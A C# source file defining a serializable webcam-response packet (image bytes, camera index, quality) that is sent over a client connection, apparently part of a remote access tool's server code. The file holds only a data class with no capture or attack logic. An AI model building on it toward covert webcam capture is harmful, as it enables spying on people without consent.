using Serveur.Controllers.Server;
using ZeroFormatter;

namespace Serveur.Packets.ClientPackets
{
    [ZeroFormattable]
    public class GetWebcamResponse : IPackets
    {
        public override TypePackets Type
        {
            get
            {
                return TypePackets.GetWebcamResponse;
            }
        }

        [Index(0)]
        public virtual byte[] image { get; set; }

        [Index(1)]
        public virtual int webcam { get; set; }

        [Index(2)]
        public virtual int quality { get; set; }

        public GetWebcamResponse()
        {
        }

        public GetWebcamResponse(byte[] image, int webcam, int quality)
        {
            this.image = image;
            this.webcam = webcam;
            this.quality = quality;
        }

        public void Execute(ClientMosaic client)
        {
            client.send(this);
        }
    }
}
